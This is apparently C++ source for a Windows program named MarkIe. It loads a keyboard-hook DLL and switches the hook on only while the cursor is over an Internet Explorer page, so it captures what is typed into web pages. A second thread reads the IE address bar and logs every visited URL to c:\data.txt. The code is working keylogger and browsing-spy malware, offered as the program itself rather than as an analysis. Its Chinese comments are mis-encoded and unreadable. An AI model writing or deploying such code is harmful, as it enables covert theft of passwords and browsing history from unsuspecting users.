// MarkIe.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include <stdio.h>
#include <string.h>
typedef BOOL (*StartHook)();
typedef BOOL (*StopHook)();
StartHook NewStartHook;
StopHook NewStopHook;

DWORD WINAPI  FindMainThread(LPVOID lpParam)
{
	BOOL bHook=TRUE;
	while(TRUE)
	{
		Sleep(1000);
		tagPOINT lpPoint;
		HWND hwnd;
		char ClassName[255];
		//�õ���굱ǰ����
		GetCursorPos(&lpPoint);
		//�õ���ǰ�������ڴ���ľ��
		hwnd=WindowFromPoint(lpPoint);
		if(hwnd==NULL)
			return 0;
		//�õ����������
		GetClassName(hwnd,ClassName,255);
		//�������ie��ҳ��ʾ����в��Ҽ��̹���û�а�װʱ����װ����
		if(strcmp(ClassName,"Internet Explorer_Server")==0&&bHook)
		{
			//��װ����
			if(!NewStartHook())
				continue;
			bHook=FALSE;
		}
		//�����û��ie��ҳ��ʾ����в��Ҽ��̹��Ӱ�װʱ��ж�ع���
		if(strcmp(ClassName,"Internet Explorer_Server")!=0&&!bHook)
		{
			if(!NewStopHook())
				continue;	
			bHook=TRUE;
		}	
	}
	return 0;
}


BOOL UrlFind(char *url)
{
	HWND hwnd;
	char ClassName[255];
	//�õ���ǰ����ھ��
	hwnd=GetForegroundWindow();
	//�õ���ǰ���������
	GetClassName(hwnd,ClassName,255);
	//�ж��Ƿ���IE����
	if(strcmp(ClassName,"IEFrame")!=0)
		return FALSE;
	//��IE�������������url��ַ��
	hwnd=::FindWindowEx(hwnd,NULL,"WorkerW",NULL);
	if(hwnd==NULL)
		return FALSE;
	hwnd=::FindWindowEx(hwnd,NULL,"ReBarWindow32",NULL);
	if(hwnd==NULL)
		return FALSE;
	hwnd=::FindWindowEx(hwnd,NULL,"ComboBoxEx32",NULL);
	if(hwnd==NULL)
		return FALSE;
	hwnd=::FindWindowEx(hwnd,NULL,"ComboBox",NULL);
	if(hwnd==NULL)
		return FALSE;
	hwnd=::FindWindowEx(hwnd,NULL,"Edit",NULL);
	if(hwnd==NULL)
		return FALSE;
	//���ַ������WM_GETTEXT��Ϣ���õ���ҳ��ַ
	SendMessage(hwnd,WM_GETTEXT,1024,(LPARAM)url);
	return TRUE;
}

int DataToFile( char *buff ) 
{ 
	//����CreateFile������ֻд��ʽ��һ���ļ�
	HANDLE hFile=CreateFile("c:\\data.txt",GENERIC_WRITE,FILE_SHARE_READ,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
	if(hFile==INVALID_HANDLE_VALUE)
	{
		printf("CreateFile error\n");
		return 0;
	}
	//����SetFilePointer���������ļ�ָ��λ�ã��ƶ����ļ�ĩβ
	if(SetFilePointer(hFile,0,NULL,FILE_END)==-1)
	{
		printf("SetFilePointer error \n");	
		return 0;	
	}
	DWORD dwWrite;
	//��buff�е�����д�뵽�ļ�ĩβ
	if(!WriteFile(hFile,buff,strlen(buff),&dwWrite,NULL))
	{
		printf("WriteFile error \n");
		return 0;
	}
	CloseHandle(hFile);
	return 0;
} 

DWORD WINAPI  FindUrlThread(LPVOID lpParam)
{
	char FirstUrl[512]={0};
	char NextUrl[512]={0};
	char Data[512]={0};
	//ѭ�����
	while(TRUE)
	{
		::Sleep(500);
		//�õ���ַ��url
		if(!UrlFind(FirstUrl))
			continue;
		//���ϴεõ���url�Ƚϣ�����ͬ������ڵ�urlд���ļ�
		if(strcmp(FirstUrl,NextUrl)==0)
			continue;
		strcpy(Data,"\r\n");
		strcat(Data,FirstUrl);
		strcat(Data,"\r\n");
		DataToFile(Data);
		//�������ڵõ���url
		strcpy(NextUrl,FirstUrl);
		//�������
		memset(FirstUrl,0x00,512);
		memset(Data,0x00,512);
	}
	return 0;
}


int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
	//���ؼ��̼�¼dll
	HMODULE hModule=LoadLibrary("Keyboard.dll");
	if(hModule==NULL)
	{
		return 0;
	}
	//�õ���װ���Ӻ����ĵ�ַ
	NewStartHook=(StartHook)GetProcAddress(hModule,"StartHook");
	//�õ�ж�ع��Ӻ����ĵ�ַ
	NewStopHook=(StartHook)GetProcAddress(hModule,"StopHook");
	if(NewStartHook==NULL||NewStopHook==NULL)
	{
		return 0;
	}
	HANDLE hThread[2];
	DWORD dwThreadId;
	//�����̣߳����ڼ�¼ie��ַ����url
	hThread[0]=::CreateThread(NULL,NULL,FindUrlThread,NULL,NULL,&dwThreadId);
	//�����̣߳����ڼ�¼��������
	hThread[1]=::CreateThread(NULL,NULL,FindMainThread,NULL,NULL,&dwThreadId);
	//�ȴ��߳��˳�
	::WaitForMultipleObjects(2,hThread,FALSE,INFINITE);
	return 0;
}



